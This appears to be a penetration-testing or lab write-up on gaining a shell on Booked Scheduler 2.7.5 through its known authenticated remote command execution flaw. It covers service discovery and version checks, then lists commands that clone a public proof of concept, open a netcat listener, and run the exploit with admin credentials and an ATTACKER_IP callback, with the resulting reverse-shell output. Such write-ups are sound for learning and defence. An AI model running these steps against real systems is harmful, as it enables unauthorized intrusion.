# Booked Scheduler

Booked Scheduler `2.7.5` can be vulnerable to authenticated remote command execution. On exposed installs, SMB log shares may leak the application administrator credentials needed for the exploit.

## Discovery

```text
8003/tcp open  http  Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_http-title: Index of /
```

Browse to:

```text
http://TARGET:8003/booked/Web/
```

The version is visible in the page footer and about page:

```text
http://TARGET:8003/booked/Web/help.php?ht=about
Booked Scheduler v2.7.5
```

Searchsploit shows authenticated RCE options:

```text
Booked Scheduler 2.7.5 - Remote Command Execution (Metasploit)          | php/webapps/46486.rb
Booked Scheduler 2.7.5 - Remote Command Execution (RCE) (Authenticated) | php/webapps/50594.py
```

## Authenticated RCE

The HackNotes PoC worked against the authenticated Booked Scheduler instance:

```bash
git clone https://github.com/hacknotes/Booked-Scheduler-v2.7.5-Remote-Command-Execution.git
cd Booked-Scheduler-v2.7.5-Remote-Command-Execution
```

Start a listener. If a common callback port fails, try a port that is already open on the target, such as `22`:

```bash
nc -nlvp 22
```

Run the exploit:

```bash
python3 bookedScheduler.py TARGET 8003 admin adminadmin ATTACKER_IP 22
```

Successful output:

```text
[.] Verificando http://TARGET:8003/booked/Web/: Ok!!
[+] VULNERABLE!!
[+] Acceso correcto!!
[+] Obtén tu shell!!
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
www-data@zino:/var/www/html/booked/Web$
```

## References

- https://www.exploit-db.com/exploits/46486
- https://www.exploit-db.com/exploits/50594
- https://github.com/hacknotes/Booked-Scheduler-v2.7.5-Remote-Command-Execution
